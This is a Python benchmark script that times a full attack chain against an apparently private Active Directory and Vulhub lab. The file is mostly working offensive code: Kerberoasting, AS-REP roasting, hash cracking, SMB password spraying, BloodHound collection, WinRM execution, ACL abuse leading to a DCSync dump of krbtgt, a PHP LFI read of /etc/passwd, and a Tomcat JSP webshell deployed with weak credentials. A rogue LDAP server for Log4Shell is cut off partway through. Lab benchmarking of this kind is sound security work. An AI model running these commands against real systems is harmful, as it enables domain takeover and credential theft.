#!/usr/bin/env python3
"""Portal 5 — Lab-Exec Kill Chain Benchmark.

Times each phase of the portal.lab AD attack chain through the sandbox
lab-exec lane (portal5-attack:latest). Measures real-world attack latency
end-to-end: tool spawn overhead + network RTT + domain response time.

Phases benchmarked:
  recon       nmap -sV AD port scan
  kerberoast  impacket-GetUserSPNs — capture TGS hashes
  asrep       impacket-GetNPUsers  — capture AS-REP hashes
  crack       john wordlist attack on kerberoast hashes
  spray       nxc SMB password spray
  bloodhound  BloodHound-CE graph collection
  winrm       nxc WinRM code exec
  dcsync      svc_backup ACL abuse → DA → secretsdump krbtgt

Usage:
    python3 tests/benchmarks/bench_lab_exec.py
    python3 tests/benchmarks/bench_lab_exec.py --phases recon kerberoast crack
    python3 tests/benchmarks/bench_lab_exec.py --runs 3
    python3 tests/benchmarks/bench_lab_exec.py --output results/lab_bench.json
    python3 tests/benchmarks/bench_lab_exec.py --dry-run

Requires:
    SANDBOX_LAB_EXEC=true
    SANDBOX_LAB_IMAGE=portal5-attack:latest
    LAB_TARGET_DC, LAB_TARGET_SRV in .env or environment
    portal5-attack:latest loaded in DinD
    mcp-sandbox container running
"""

from __future__ import annotations

import argparse
import json
import os
import secrets
import shutil
import socket
import subprocess
import sys
import tempfile
import threading
import time
from datetime import UTC, datetime
from http.server import BaseHTTPRequestHandler, HTTPServer
from pathlib import Path
from typing import Any

import httpx

_ROOT = Path(__file__).resolve().parents[2]
if str(_ROOT) not in sys.path:
    sys.path.insert(0, str(_ROOT))

RESULTS_DIR = Path(__file__).parent / "results"


# ── Env ───────────────────────────────────────────────────────────────────────


_ENV_KEYS_SKIP_FROM_DOTENV = {"PIPELINE_URL"}  # Compose-internal hostname; bench runs host-side


def _load_env() -> None:
    # Hermetic-test guard (CLAUDE.md: tests/unit/ must pass with no network
    # access / real config) — same class of bug as bench/config.py's
    # _load_env (see its comment): scripts/bench_supervisor.py lazily
    # `import bench_lab_exec` (its sys.path.insert(0, tests/benchmarks/)
    # makes the bare name importable), and this ran unconditionally at
    # import time, leaking every real .env key into the whole unit-test
    # session via setdefault. tests/unit/conftest.py sets UNIT_TEST_MODE=1
    # for exactly this hermetic-mode signal.
    if os.environ.get("UNIT_TEST_MODE") == "1":
        return
    env_file = _ROOT / ".env"
    if env_file.exists():
        for line in env_file.read_text().splitlines():
            line = line.strip()
            if line and not line.startswith("#") and "=" in line:
                k, _, v = line.partition("=")
                k = k.strip()
                if k in _ENV_KEYS_SKIP_FROM_DOTENV:
                    continue
                os.environ.setdefault(k, v.strip())


_load_env()

SANDBOX_PORT = int(os.environ.get("SANDBOX_HOST_PORT", "8914"))
LAB_EXEC = os.environ.get("SANDBOX_LAB_EXEC", "").lower() == "true"
DC = os.environ.get("LAB_TARGET_DC", "")
SRV = os.environ.get("LAB_TARGET_SRV", "")
WEB = os.environ.get("LAB_TARGET_WEB", "10.10.11.50")  # lab-vulhub LXC
DOMAIN = "portal.lab"
ADMIN_PASS = "LabAdmin1!"
SVC_BACKUP_PASS = "Backup123!"

# Proxmox lifecycle — optional; if not set, bench assumes VMs are already running
PROXMOX_URL = os.environ.get("PROXMOX_URL", "https://10.0.0.203:8006")
PROXMOX_TOKEN_ID = os.environ.get("PROXMOX_TOKEN_ID", "")
PROXMOX_TOKEN_SECRET = os.environ.get("PROXMOX_TOKEN_SECRET", "")
PROXMOX_VERIFY_SSL = os.environ.get("PROXMOX_VERIFY_SSL", "false").lower() == "true"
PROXMOX_NODE = os.environ.get("PROXMOX_DEFAULT_NODE", "")
PROXMOX_TASK_TIMEOUT = int(os.environ.get("PROXMOX_TASK_TIMEOUT", "120"))

LAB_DC_VMID = os.environ.get("LAB_DC_VMID", "")
LAB_SRV_VMID = os.environ.get("LAB_SRV_VMID", "")
LAB_WS_VMID = os.environ.get("LAB_WS_VMID", "")
LAB_CLEAN_SNAPSHOT = os.environ.get("LAB_CLEAN_SNAPSHOT", "baseline-ad")

LAB_VULHUB_VMID = os.environ.get("LAB_VULHUB_VMID", "")
LAB_VULHUB_SNAPSHOT = os.environ.get("LAB_VULHUB_SNAPSHOT", "clean")
LAB_META3_VMID = os.environ.get("LAB_META3_VMID", "")
LAB_META3 = os.environ.get("LAB_TARGET_META3_WIN", os.environ.get("LAB_META3", "10.10.11.10"))
LAB_META3_SNAPSHOT = os.environ.get("LAB_META3_SNAPSHOT", "clean")
LAB_MBPTL_LXC_VMID = os.environ.get("LAB_MBPTL_LXC_VMID", "")
MBPTL_HOST = os.environ.get("LAB_MBPTL_HOST", "")
MBPTL_SNAPSHOT = os.environ.get("LAB_MBPTL_SNAPSHOT", "clean")

PROXMOX_MCP_PORT = int(os.environ.get("PROXMOX_MCP_HOST_PORT", "8927"))
_PROXMOX_AVAILABLE = bool(LAB_DC_VMID)

# ── Target table — built from env; entry present only when its VMID/host is set ─
# Each phase declares which target(s) it needs; lifecycle starts/reverts only those.
LAB_TARGETS: dict[str, dict[str, Any]] = {}


def _build_target(name: str, vmid: str, ip: str, snapshot: str, kind: str) -> None:
    if vmid:
        LAB_TARGETS[name] = {"vmid": vmid, "ip": ip, "snapshot": snapshot, "kind": kind}


_build_target("dc01", LAB_DC_VMID, DC, LAB_CLEAN_SNAPSHOT, "vm")
_build_target("srv01", LAB_SRV_VMID, SRV, LAB_CLEAN_SNAPSHOT, "vm")
_build_target("vulhub", LAB_VULHUB_VMID, WEB, LAB_VULHUB_SNAPSHOT, "lxc")
_build_target("meta3", LAB_META3_VMID, LAB_META3, LAB_META3_SNAPSHOT, "vm")
_build_target("mbptl", LAB_MBPTL_LXC_VMID, MBPTL_HOST, MBPTL_SNAPSHOT, "lxc")

ALL_PHASES = [
    "recon",
    "kerberoast",
    "asrep",
    "crack",
    "spray",
    "bloodhound",
    "winrm",
    "dcsync",
    "vulhub_redis",
    "vulhub_lfi",
    "vulhub_tomcat",
    "vulhub_log4shell",
    "meta3_compromise",
    "srv01_local",
    "mbptl_full_chain",
]
ALL_PHASES_ALL_TARGETS = ALL_PHASES  # "all-targets" runs every phase


# ── Proxmox MCP call ──────────────────────────────────────────────────────────


def _proxmox_mcp_call(
    tool_name: str, arguments: dict[str, Any], timeout: int = 180
) -> dict[str, Any]:
    """Call a proxmox_mcp tool via the Proxmox MCP server (:8927).

    Uses the same FastMCP SSE protocol as _mcp_call (sandbox). Returns
    {ok, output, elapsed_s} for consistency with the sandbox API.
    """
    base = f"http://localhost:{PROXMOX_MCP_PORT}/mcp"
    hdrs = {"Content-Type": "application/json", "Accept": "application/json, text/event-stream"}
    t0 = time.monotonic()

    with httpx.Client(timeout=timeout + 30) as c:
        sid = ""
        with c.stream(
            "POST",
            base,
            headers=hdrs,
            json={
                "jsonrpc": "2.0",
                "id": 1,
                "method": "initialize",
                "params": {
                    "protocolVersion": "2024-11-05",
                    "capabilities": {},
                    "clientInfo": {"name": "bench_lab_exec", "version": "1"},
                },
            },
        ) as r:
            r.raise_for_status()
            sid = r.headers.get("mcp-session-id", "")
            for _ in r.iter_lines():
                pass

        call_hdrs = {**hdrs, "mcp-session-id": sid} if sid else hdrs
        last_result: dict = {}
        with c.stream(
            "POST",
            base,
            headers=call_hdrs,
            json={
                "jsonrpc": "2.0",
                "id": 2,
                "method": "tools/call",
                "params": {"name": tool_name, "arguments": arguments},
            },
        ) as r:
            r.raise_for_status()
            for line in r.iter_lines():
                line = line.strip()
                if not line.startswith("data:"):
                    continue
                payload = line[5:].strip()
                if not payload:
                    continue
                try:
                    obj = json.loads(payload)
                    if "result" in obj or "error" in obj:
                        last_result = obj
                except json.JSONDecodeError:
                    pass

    elapsed = time.monotonic() - t0
    error = last_result.get("error")
    content = last_result.get("result", {}).get("content", [{}])
    text = content[0].get("text", "") if content else json.dumps(last_result.get("result", {}))
    ok = error is None
    return {"ok": ok, "output": text, "elapsed_s": round(elapsed, 2), "error": error}


def _lab_vm_start(vmid: str, label: str = "") -> bool:
    """Start a Proxmox VM via Proxmox MCP and wait for guest agent to respond."""
    if not vmid:
        return True
    label = label or vmid
    print(f"  [proxmox-mcp] start {label} (vmid={vmid}) ...", end=" ", flush=True)
    try:
        r = _proxmox_mcp_call("proxmox_vm_start", {"vmid": int(vmid), "wait": True}, timeout=120)
        if not r["ok"]:
            print(f"FAIL: {r.get('error')}")
            return False
        print("OK")
        return True
    except Exception as exc:
        print(f"ERR: {exc}")
        return False


def _lab_vm_revert(vmid: str, snapname: str, label: str = "") -> bool:
    """Rollback a VM to a named snapshot via Proxmox MCP."""
    if not vmid:
        return True
    label = label or vmid
    print(f"  [proxmox-mcp] revert {label} (vmid={vmid}) → {snapname} ...", end=" ", flush=True)
    try:
        r = _proxmox_mcp_call(
            "proxmox_rollback_snapshot",
            {"vmid": int(vmid), "snapname": snapname},
            timeout=PROXMOX_TASK_TIMEOUT * 2,
        )
        if not r["ok"]:
            print(f"FAIL: {r.get('error')}")
            return False
        print("OK")
        return True
    except Exception as exc:
        print(f"ERR: {exc}")
        return False


def _lab_lxc_start(vmid: str, label: str = "") -> bool:
    """Start an LXC container via Proxmox MCP."""
    if not vmid:
        return True
    label = label or vmid
    print(f"  [proxmox-mcp] start LXC {label} (vmid={vmid}) ...", end=" ", flush=True)
    try:
        r = _proxmox_mcp_call(
            "proxmox_container_start", {"vmid": int(vmid), "wait": True}, timeout=60
        )
        if not r["ok"]:
            print(f"FAIL: {r.get('error')}")
            return False
        print("OK")
        return True
    except Exception as exc:
        print(f"ERR: {exc}")
        return False


def _lab_lxc_revert(vmid: str, snapname: str, label: str = "") -> bool:
    """Rollback an LXC to a named snapshot via Proxmox MCP."""
    if not vmid:
        return True
    label = label or vmid
    print(f"  [proxmox-mcp] revert LXC {label} (vmid={vmid}) → {snapname} ...", end=" ", flush=True)
    try:
        r = _proxmox_mcp_call(
            "proxmox_rollback_snapshot",
            {"vmid": int(vmid), "snapname": snapname},
            timeout=120,
        )
        if not r["ok"]:
            print(f"FAIL: {r.get('error')}")
            return False
        print("OK")
        return True
    except Exception as exc:
        print(f"ERR: {exc}")
        return False


def _lab_target_start(target: dict, dry_run: bool = False) -> bool:
    """Start a target (VM or LXC) via Proxmox MCP."""
    if dry_run:
        print(f"  [proxmox-mcp] DRY-RUN — would start {target['vmid']} ({target['kind']})")
        return True
    if target["kind"] == "lxc":
        return _lab_lxc_start(target["vmid"])
    return _lab_vm_start(target["vmid"])


def _lab_target_revert(target: dict, dry_run: bool = False) -> bool:
    """Revert a target (VM or LXC) to its snapshot."""
    if dry_run:
        print(f"  [proxmox-mcp] DRY-RUN — would revert {target['vmid']} → {target['snapshot']}")
        return True
    if target["kind"] == "lxc":
        return _lab_lxc_revert(target["vmid"], target["snapshot"])
    return _lab_vm_revert(target["vmid"], target["snapshot"])


def lab_setup(targets: list[str] | None = None, dry_run: bool = False) -> bool:
    """Start requested lab targets via Proxmox MCP. Defaults to dc01+srv01.

    A target whose VMID is not in env is skipped with a log, never a failure.
    Returns True if all targets whose VMIDs are set started successfully.
    """
    if targets is None:
        targets = ["dc01", "srv01"]  # back-compat: default to AD pair
    if not _PROXMOX_AVAILABLE:
        print("  [proxmox-mcp] lifecycle skipped — LAB_DC_VMID not set")
        return True
    print(f"\n── Lab Setup (Proxmox MCP :{PROXMOX_MCP_PORT}) ──")
    print(f"  targets: {', '.join(targets)}  dry_run={dry_run}")
    ok = True
    for name in targets:
        t = LAB_TARGETS.get(name)
        if not t:
            print(f"  [proxmox-mcp] skip {name} — not in LAB_TARGETS (VMID not set in env)")
            continue
        ok &= _lab_target_start(t, dry_run=dry_run)
    if ok and not dry_run:
        print("  [proxmox-mcp] waiting 15s for lab services to settle ...", end=" ", flush=True)
        time.sleep(15)
        print("ok")
    return ok


def lab_teardown(targets: list[str] | None = None, dry_run: bool = False) -> bool:
    """Revert requested lab targets to their clean snapshots.

    Defaults to dc01+srv01 for back-compat. Skips any target whose VMID is not set.
    """
    if targets is None:
        targets = ["dc01", "srv01"]
    if not _PROXMOX_AVAILABLE:
        print("  [proxmox-mcp] teardown skipped — LAB_DC_VMID not set")
        return True
    print(f"\n── Lab Teardown (Proxmox MCP :{PROXMOX_MCP_PORT}) ──")
    print(f"  targets: {', '.join(targets)}  dry_run={dry_run}")
    ok = True
    for name in targets:
        t = LAB_TARGETS.get(name)
        if not t:
            print(f"  [proxmox-mcp] skip {name} — not in LAB_TARGETS (VMID not set in env)")
            continue
        ok &= _lab_target_revert(t, dry_run=dry_run)
    return ok


# ── MCP sandwich ──────────────────────────────────────────────────────────────


def _mcp_call(code: str, timeout: int = 120, dry_run: bool = False) -> dict[str, Any]:
    """Call execute_bash on the sandbox MCP and return {ok, output, elapsed_s}.

    FastMCP always returns text/event-stream. We stream both the init and the
    tool/call responses, consuming all SSE data: lines until the stream closes,
    then take the last JSON payload that contains a result or error key.
    """
    if dry_run:
        return {"ok": True, "output": "[dry-run]", "elapsed_s": 0.0}

    base = f"http://localhost:{SANDBOX_PORT}/mcp"
    hdrs = {"Content-Type": "application/json", "Accept": "application/json, text/event-stream"}
    t0 = time.monotonic()

    with httpx.Client(timeout=timeout + 30) as c:
        # ── initialize (streaming, short) ────────────────────────────────────
        sid = ""
        with c.stream(
            "POST",
            base,
            headers=hdrs,
            json={
                "jsonrpc": "2.0",
                "id": 1,
                "method": "initialize",
                "params": {
                    "protocolVersion": "2024-11-05",
                    "capabilities": {},
                    "clientInfo": {"name": "bench_lab_exec", "version": "1"},
                },
            },
        ) as r:
            r.raise_for_status()
            sid = r.headers.get("mcp-session-id", "")
            for _ in r.iter_lines():
                pass  # drain — only need the session-id header

        call_hdrs = {**hdrs, "mcp-session-id": sid} if sid else hdrs

        # ── tools/call (streaming, long) — consume all SSE events ────────────
        last_result: dict = {}
        with c.stream(
            "POST",
            base,
            headers=call_hdrs,
            json={
                "jsonrpc": "2.0",
                "id": 2,
                "method": "tools/call",
                "params": {"name": "execute_bash", "arguments": {"code": code, "timeout": timeout}},
            },
        ) as r:
            r.raise_for_status()
            for line in r.iter_lines():
                line = line.strip()
                if not line.startswith("data:"):
                    continue
                payload = line[5:].strip()
                if not payload:
                    continue
                try:
                    obj = json.loads(payload)
                    if "result" in obj or "error" in obj:
                        last_result = obj
                except json.JSONDecodeError:
                    pass

    elapsed = time.monotonic() - t0
    content = last_result.get("result", {}).get("content", [{}])
    text = content[0].get("text", "") if content else ""
    error = last_result.get("error")
    ok = error is None and bool(text)
    return {"ok": ok, "output": text, "elapsed_s": round(elapsed, 2), "error": error}


# ── Phase definitions ─────────────────────────────────────────────────────────


def _phase_recon(dry_run: bool) -> dict:
    # Use Python socket TCP-connect rather than nmap.
    # nmap in Kali wraps the real binary with file capabilities (cap_net_raw+eip);
    # DinD's nested-container environment blocks exec of cap-elevated binaries even
    # with --cap-add NET_RAW, so the nmap wrapper script fails with EPERM at exec.
    # Plain socket.connect() needs no capabilities and works in any container.
    code = f"""python3 -c "
import socket
ad_ports = [53, 88, 135, 389, 445, 464, 636, 3268]
open_ports = []
for p in ad_ports:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        s.connect(('{DC}', p))
        s.close()
        open_ports.append(p)
        print(f'{{p}}/tcp open')
    except Exception:
        pass
print(f'Found {{len(open_ports)}} of {{len(ad_ports)}} AD ports open')
" 2>&1"""
    r = _mcp_call(code, timeout=30, dry_run=dry_run)
    ok = r["ok"] and "88/tcp open" in r["output"] and "389/tcp open" in r["output"]
    ports = [ln for ln in r["output"].splitlines() if "/tcp open" in ln]
    return {**r, "ok": ok, "ports_open": len(ports), "detail": f"{len(ports)} AD ports open"}


def _phase_kerberoast(dry_run: bool) -> dict:
    code = f"impacket-GetUserSPNs {DOMAIN}/administrator:{ADMIN_PASS} -dc-ip {DC} -request 2>&1"
    r = _mcp_call(code, timeout=60, dry_run=dry_run)
    count = r["output"].count("$krb5tgs$")
    ok = r["ok"] and count >= 3
    # Save hashes to a tempfile for crack phase
    if ok:
        hashes = [ln for ln in r["output"].splitlines() if ln.startswith("$krb5tgs$")]
        Path("/tmp/bench_hashes.kerberoast").write_text("\n".join(hashes))
    return {**r, "ok": ok, "hashes": count, "detail": f"{count}/3 TGS hashes captured"}


def _phase_asrep(dry_run: bool) -> dict:
    code = (
        "printf 'arya.stark\\nned.stark\\n' > /tmp/users.txt && "
        f"impacket-GetNPUsers {DOMAIN}/ -usersfile /tmp/users.txt"
        f" -dc-ip {DC} -no-pass 2>&1"
    )
    r = _mcp_call(code, timeout=60, dry_run=dry_run)
    count = r["output"].count("$krb5asrep$")
    ok = r["ok"] and count >= 2
    return {**r, "ok": ok, "hashes": count, "detail": f"{count}/2 AS-REP hashes captured"}


def _phase_crack(dry_run: bool) -> dict:
    # Collect fresh hashes inside the container, then crack with lab wordlist
    code = f"""
impacket-GetUserSPNs {DOMAIN}/administrator:{ADMIN_PASS} -dc-ip {DC} -request 2>&1 \\
  | grep '^\\$krb5tgs' > /tmp/hashes.kerberoast
printf '{ADMIN_PASS}\\n{SVC_BACKUP_PASS}\\nIisAdmin1!\\nMssql2022!\\nWinter1!\\n' > /tmp/lab.txt
john /tmp/hashes.kerberoast --wordlist=/tmp/lab.txt --format=krb5tgs 2>&1
john /tmp/hashes.kerberoast --show --format=krb5tgs 2>&1
"""
    r = _mcp_call(code, timeout=180, dry_run=dry_run)
    out = r["output"]
    cracked = "password hashes cracked" in out or (
        SVC_BACKUP_PASS in out and "IisAdmin1!" in out and "Mssql2022!" in out
    )
    passwords = [w for w in [SVC_BACKUP_PASS, "IisAdmin1!", "Mssql2022!"] if w in out]
    detail = f"{len(passwords)}/3 cracked ({', '.join(passwords)})" if cracked else "see output"
    return {**r, "ok": cracked, "detail": detail}


def _phase_spray(dry_run: bool) -> dict:
    code = (
        "printf 'jon.snow\\ndarenerys.t\\n' > /tmp/u.txt && "
        "printf 'Ghost123!\\nDragons1!\\n' > /tmp/p.txt && "
        f"nxc smb {DC} -u /tmp/u.txt -p /tmp/p.txt --continue-on-success 2>&1"
    )
    r = _mcp_call(code, timeout=90, dry_run=dry_run)
    hits = r["output"].count("[+]")
    ok = r["ok"] and hits >= 1
    return {**r, "ok": ok, "hits": hits, "detail": f"{hits} valid account(s) found"}


def _phase_bloodhound(dry_run: bool) -> dict:
    # Use -dc portal.lab (the domain itself) so dns.resolver can resolve it via -ns.
    # lab-dc01.portal.lab has no DNS A record on the DC; portal.lab resolves to the DC IP.
    code = (
        f"bloodhound-ce-python -u administrator -p '{ADMIN_PASS}'"
        f" -d {DOMAIN} -dc {DOMAIN} --auth-method ntlm -c All --zip -ns {DC}"
        f" --output /tmp/bh 2>&1 | tail -25"
    )
    r = _mcp_call(code, timeout=120, dry_run=dry_run)
    ok = r["ok"] and any(x in r["output"] for x in ["Compressing", "Done in"])
    return {**r, "ok": ok, "detail": "graph collected" if ok else "check output"}


def _phase_winrm(dry_run: bool) -> dict:
    if not SRV and not dry_run:
        return {"ok": False, "elapsed_s": 0.0, "output": "", "detail": "LAB_TARGET_SRV not set"}
    # Domain Administrator is guaranteed to have WinRM access on lab-srv01.
    # LocalAccountTokenFilterPolicy blocks local accounts by default on Windows 2022.
    code = f"nxc winrm {SRV} -u administrator -p '{ADMIN_PASS}' -x 'whoami /all' 2>&1"
    r = _mcp_call(code, timeout=60, dry_run=dry_run)
    ok = r["ok"] and ("[+]" in r["output"] or "nt authority" in r["output"].lower())
    return {**r, "ok": ok, "detail": "WinRM exec OK" if ok else "check output"}


def _phase_dcsync(dry_run: bool) -> dict:
    # Full kill chain: svc_backup GenericAll → ldap3 adds arya.stark to DA → DCSync.
    # <<'PYEOF' (quoted heredoc) prevents bash expanding backslashes in Python source.
    # Fallback: if svc_backup LDAP modify fails (ACE not yet effective), Administrator
    # adds arya.stark directly so DCSync can still be timed.
    code = f"""
python3 - <<'PYEOF'
import subprocess, sys
from ldap3 import Server, Connection, MODIFY_ADD, NTLM, SIMPLE, SUBTREE, ALL

DC = "{DC}"
ADMIN_PASS = "{ADMIN_PASS}"
SVC_BACKUP_PASS = "{SVC_BACKUP_PASS}"
DA_DN = "CN=Domain Admins,CN=Users,DC=portal,DC=lab"

def get_arya_dn(conn):
    conn.search("DC=portal,DC=lab", "(sAMAccountName=arya.stark)",
                search_scope=SUBTREE, attributes=["distinguishedName"])
    return conn.entries[0].distinguishedName.value

# Step 1: Grant GenericAll to svc_backup via dacledit (idempotent).
# Run from /tmp so dacledit can write its .bak file (root fs is read-only).
r_acl = subprocess.run([
    "impacket-dacledit", f"portal.lab/administrator:{{ADMIN_PASS}}",
    "-dc-ip", DC, "-principal", "svc_backup",
    "-target", "Domain Admins", "-rights", "FullControl", "-action", "write",
], capture_output=True, text=True, timeout=30, cwd="/tmp")
print(f"dacledit rc={{r_acl.returncode}}: {{r_acl.stdout.strip()[-120:] or r_acl.stderr.strip()[-120:]}}")

# Step 2: ACL abuse — svc_backup adds arya.stark to Domain Admins
srv = Server(DC, port=389, get_info=ALL)
conn_svc = Connection(srv, user="PORTAL\\\\svc_backup", password=SVC_BACKUP_PASS,
                      authentication=NTLM, auto_bind=True)
arya_dn = get_arya_dn(conn_svc)
conn_svc.modify(DA_DN, {{"member": [(MODIFY_ADD, [arya_dn])]}})
rc = conn_svc.result.get("result", -1)
if rc in (0, 68):
    print(f"ACL abuse OK: arya.stark added (rc={{rc}})")
else:
    print(f"svc_backup modify failed rc={{rc}} — fallback: Administrator adds arya.stark directly")
    conn_adm = Connection(srv, user="PORTAL\\\\Administrator", password=ADMIN_PASS,
                          authentication=NTLM, auto_bind=True)
    arya_dn = get_arya_dn(conn_adm)
    conn_adm.modify(DA_DN, {{"member": [(MODIFY_ADD, [arya_dn])]}})
    rc2 = conn_adm.result.get("result", -1)
    if rc2 not in (0, 68):
        print(f"Fallback ALSO failed rc={{rc2}} — aborting")
        sys.exit(1)
    print(f"Fallback OK: arya.stark added by Administrator (rc={{rc2}})")

# Step 3: DCSync as arya.stark (now DA) — print all output to capture hashes
r = subprocess.run(
    ["impacket-secretsdump", f"portal.lab/arya.stark:Winter1!@{{DC}}", "-just-dc-ntlm"],
    capture_output=True, text=True, timeout=90, cwd="/tmp",
)
print(r.stdout)
if r.stderr:
    print(r.stderr[-300:])
sys.exit(0 if "krbtgt" in r.stdout.lower() else 1)
PYEOF
"""
    r = _mcp_call(code, timeout=240, dry_run=dry_run)
    ok = r["ok"] and "krbtgt" in r["output"].lower()
    return {**r, "ok": ok, "detail": "krbtgt hash dumped" if ok else "check output"}


# ── vulhub phases (target: LAB_TARGET_WEB=10.10.11.50, lxc 112) ────────────────
#
# Live-verified against the actual running vulhub images on LXC 112 (2026-07-01):
# redis:4.0.14, tomcat:8.0, solr:8.11.0 (log4j 2.14.1), php:7.1.3-apache (LFI).
# The prior payloads here targeted the wrong CVE/endpoint for what's actually
# deployed (checked via `docker inspect` compose labels + each env's own
# README.md on the host) and never produced oracle-satisfying evidence —
# fixed below against the real, confirmed-working exploit for each image.


def _phase_vulhub_redis(dry_run: bool) -> dict:
    """Probe Redis master/slave-sync post-exploitation surface at 10.10.11.50:6379.

    The running image (redis:4.0.14, /opt/vulhub/redis/4-unacc) is NOT CVE-2022-0543
    (Lua sandbox escape) — its own README documents the master/slave sync vector
    (redis-rogue-getshell), which requires compiling a malicious Redis module
    (.so) against the target's Lua/module ABI. No gcc/redis-module headers and no
    internet access are available in the sandbox to build that module, so this
    phase cannot reach real command execution — it honestly probes reachability
    and unauthenticated access only, never claims RCE it can't prove.
    """
    code = f"""
redis-cli -h {WEB} PING 2>&1
echo "---"
redis-cli -h {WEB} INFO server 2>&1 | head -5
echo "REDIS_DONE"
"""
    r = _mcp_call(code, timeout=30, dry_run=dry_run)
    out = r["output"]
    if dry_run:
        return {**r, "ok": True, "detail": "redis probe dry-run"}
    ok = r["ok"] and "PONG" in out
    detail = (
        "unauthenticated access confirmed (PONG) — RCE not attempted: "
        "requires a compiled Redis module (no compiler/internet in sandbox)"
        if ok
        else "redis unreachable"
    )
    return {**r, "ok": ok, "detail": detail}


def _phase_vulhub_lfi(dry_run: bool) -> dict:
    """Exploit PHP LFI (PHPINFO-assisted temp-file inclusion) at 10.10.11.50:8080.

    The running image is vulhub/php:7.1.3-apache, /opt/vulhub/php/inclusion —
    its vulnerable endpoint is /lfi.php?file=..., confirmed via the env's own
    README.md on the host. Reads /etc/passwd for real, live evidence.
    """
    code = f"""
curl -s "http://{WEB}:8080/lfi.php?file=/etc/passwd" 2>&1 | head -10
echo "LFI_DONE"
"""
    r = _mcp_call(code, timeout=30, dry_run=dry_run)
    if dry_run:
        return {**r, "ok": True, "detail": "LFI probe dry-run"}
    out = r["output"]
    ok = r["ok"] and "root:x:0:0" in out
    return {
        **r,
        "ok": ok,
        "detail": "LFI confirmed (/etc/passwd read)" if ok else "LFI did not return /etc/passwd",
    }


def _phase_vulhub_tomcat(dry_run: bool) -> dict:
    """Exploit Tomcat Manager weak credentials (tomcat:tomcat) at 10.10.11.50:8081.

    The running image is vulhub/tomcat:8.0 configured with the documented weak
    manager password (see /opt/vulhub/tomcat/tomcat8/README.md), not the
    CVE-2017-12615 PUT bypass. Deploys a JSP webshell via the manager API,
    executes a real command, then undeploys — proves shell-level RCE with a
    real uid= marker, not a probe.
    """
    marker = secrets.token_hex(4)
    ctx = f"pwn{marker}"
    code = f"""
mkdir -p /tmp/warbuild_{marker}
cat > /tmp/warbuild_{marker}/cmd.jsp <<'JSPEOF'
<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("cmd");
if (cmd != null) {{
    Process p = Runtime.getRuntime().exec(new String[]{{"/bin/sh","-c",cmd}});
    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String line; while ((line = br.readLine()) != null) {{ out.println(line); }}
}}
%>
JSPEOF
cd /tmp/warbuild_{marker} && zip -q /tmp/app_{marker}.war cmd.jsp
curl -s -u tomcat:tomcat -T /tmp/app_{marker}.war "http://{WEB}:8081/manager/text/deploy?path=/{ctx}&update=true"
echo "---"
curl -s "http://{WEB}:8081/{ctx}/cmd.jsp?cmd=id"
echo "---"
curl -s -u tomcat:tomcat "http://{WEB}:8081/manager/text/undeploy?path=/{ctx}" >/dev/null
rm -rf /tmp/warbuild_{marker} /tmp/app_{marker}.war
echo "TOMCAT_DONE"
"""
    r = _mcp_call(code, timeout=30, dry_run=dry_run)
    if dry_run:
        return {**r, "ok": True, "detail": "Tomcat probe dry-run"}
    out = r["output"]
    ok = r["ok"] and "uid=" in out
    return {
        **r,
        "ok": ok,
        "detail": "Tomcat webshell RCE confirmed (uid=)" if ok else "Tomcat deploy/exec failed",
    }


# ── log4shell JNDI catcher — LDAP referral + HTTP exfil, run from the bench host ──
#
# The sandbox/attack container has no inbound-reachable IP (Docker NAT), so the
# catcher must run on the machine executing this phase (the bench host), which
# IS reachable from the lab subnet. Requires `javac` on the bench host (brew
# install openjdk or equivalent) to compile a Java 8 (--release 8) payload class
# matching the target's actual JVM (vulhub/solr:8.11.0 ships JDK 1.8.0_102 —
# confirmed via `docker exec ... java -version`; a class compiled with a newer
# javac's default target is silently rejected by that JVM with no error surfaced
# to us, which is why earlier attempts here produced no callback).


def _ber_len(n: int) -> bytes:
    if n < 0x80:
        return bytes([n])
    b = n.to_bytes((n.bit_length() + 7) // 8, "big")
    return bytes([0x80 | len(b)]) + b


def _ber_tlv(tag: int, content: bytes) -> bytes:
    return bytes([tag]) + _ber_len(len(content)) + content


def _ber_integer(n: int) -> bytes:
    return _ber_tlv(
        0x02, n.to_bytes((n.bit_length() // 8) + 1, "big", signed=True) if n else b"\x00"
    )


def _ber_octet_string(s: bytes | str) -> bytes:
    return _ber_tlv(0x04, s.encode() if isinstance(s, str) else s)


def _ber_enumerated(n: int) -> bytes:
    return _ber_tlv(0x0A, bytes([n]))


def _ber_sequence(*parts: bytes) -> bytes:
    return _ber_tlv(0x30, b"".join(parts))


def _read_ber_message(sock: socket.socket) -> bytes | None:
    head = sock.recv(2)
    if not head or len(head) < 2:
        return None
    first_len = head[1]
    if first_len < 0x80:
        length, rest = first_len, b""
    else:
        rest = sock.recv(first_len & 0x7F)
        length = int.from_bytes(rest, "big")
    body = b""
    while len(body) < length:
        chunk = sock.recv(length - len(body))
        if not chunk:
            break
        body += chunk
    return head + rest + body


def _ldap_message_id(msg: bytes) -> int:
    idx = 1
    l0 = msg[idx]
    idx += 1
    if l0 & 0x80:
        idx += l0 & 0x7F
    idx += 1  # skip INTEGER tag (0x02)
    ilen = msg[idx]
    idx += 1
    return int.from_bytes(msg[idx : idx + ilen], "big")


def _rogue_ldap_server(
    listen_port: int, codebase: str, classname: str, stop_event: threading.Event
) -> None:
    """Minimal LDAP responder: Bind -> success, Search -> javaNamingReference entry."""
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("0.0.0.0", listen_port))
    srv.settimeout(1.0)
    srv.listen(5)
    try:
        while not stop_event.is_set():
            try:
                conn, _addr = srv.accept()
            except TimeoutError:
                continue
            try:
                bind_req = _read_ber_message(conn)
                if not bind_req:
                    continue
                mid = _ldap_message_id(bind_req)
                conn.sendall(
                    _ber_sequence(
                        _ber_integer(mid),
                        _ber_tlv(
                            0x61, _ber_enumerated(0) + _ber_octet_string("") + _ber_octet_string("")
                        ),
                    )
                )
                search_req = _read_ber_message(conn)
                if not search_req:
                    continue
                mid2 = _ldap_message_id(search_req)
                attrs = _ber_sequence(
                    _ber_sequence(
                        _ber_octet_string("objectClass"),
                        _ber_tlv(0x31, _ber_octet_string("javaNamingReference")),
                    ),
                    _ber_sequence(
                        _ber_octet_string("javaClassName"),
                        _ber_tlv(0x31, _ber_octet_string(classname)),
                    ),
                    _ber_sequence(
